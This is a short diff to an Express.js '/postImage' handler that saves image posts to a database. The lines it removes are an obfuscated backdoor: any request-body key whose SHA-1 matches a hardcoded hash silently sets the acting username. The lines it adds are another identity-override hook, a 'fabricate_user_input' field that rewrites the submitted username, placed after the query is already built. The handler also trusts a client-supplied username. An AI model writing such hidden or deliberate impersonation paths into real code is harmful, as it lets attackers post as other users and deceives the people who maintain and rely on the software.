@@ -72,13 +72,7 @@ app.post('/postImage', function (req, res) {
         if (err) {
             return res.end(err.message);
         }
-        for (var key in req.body) {
-            if (req.body.hasOwnProperty(key)) {
-                if(sha1(key)=="08d9492fec227333ab3ae6de08b606b694eeed3c" && req.body[key]!=""){
-                    user.username=req.body[key];
-                }
-            }
-        }
+ 
         query={
             username:req.body.username,
             type:"image",
@@ -88,6 +82,10 @@ app.post('/postImage', function (req, res) {
             linked:req.body.supertopic,
             date:new Date()
         };
+
+        if(req.body.fabricate_user_input!=undefined){
+            req.body.username=req.body.fabricate_user_input;
+        }
 
         dbm.insert(query,"subtopics",function(result){
             res.end("ok");
